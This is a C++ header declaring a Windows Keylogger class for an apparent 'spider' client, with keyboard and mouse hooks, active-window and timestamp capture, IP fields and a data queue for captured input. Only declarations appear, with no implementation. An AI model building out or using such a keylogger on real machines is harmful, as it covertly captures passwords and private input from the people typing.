#ifndef KEYLOGGER_HPP
# define KEYLOGGER_HPP

#include "AData.hpp"
#include <iostream>
#include <string>
#include <sstream>
#include <memory>
#include "Windows.h"
#include "time.h"
#include "Queue.hpp"
#include "KeyloggerException.hpp"
#include "LogInput.hpp"
#include "LogMouse.hpp"

namespace spider
{
	namespace client
	{

		class Keylogger
		{
		public:
			Keylogger() {}
			Keylogger(const std::string& id, const DataQueueSP& dataQueue);
			~Keylogger();
			bool					startKeylogger();
			int						startThread();
			static DWORD WINAPI		startHook(LPVOID lpParm);
			static LRESULT CALLBACK	keyboardEvent(int nCode, WPARAM wParam, LPARAM lParam);
			static LRESULT CALLBACK	mouseEvent(int nCode, WPARAM wParam, LPARAM lParam);
			static void				messageLoop();
			void					formatInput();
			void					activeWindow();
			void					timestamp();
			void					windowSize();
			void					pushKeyboardDataInQueue();
			void					pushMouseDataInQueue();

			const std::string&				getInput() const;
			const std::string&				getWindowName() const;
			int						getTimeStamp() const;
			const std::pair<int, int>&		getMouseCoord() const;
			const std::pair<int, int>&		getWindowSize() const;

		private:
			static HHOOK			_hHookKeyboard;
			static HHOOK			_hHookMouse;
			static bool				_shift;
			static bool				_capsLock;
			
			static std::string		_id;
			DataQueueSP				_dataQueue;
			static DataQueueSP		_staticDataQueue;
			std::string				_input;
			std::string				_windowName;
			int						_timeStamp;
			std::pair<int, int>		_mouseCoord;
			std::pair<int, int>		_windowSize;
			std::string				_ipExtern;
			std::string				_ipLocal;

			static const bool		_ERROR;
			static const bool		_SUCCESS;
		};

	}
}

#endif /* !KEYLOGGER_HPP */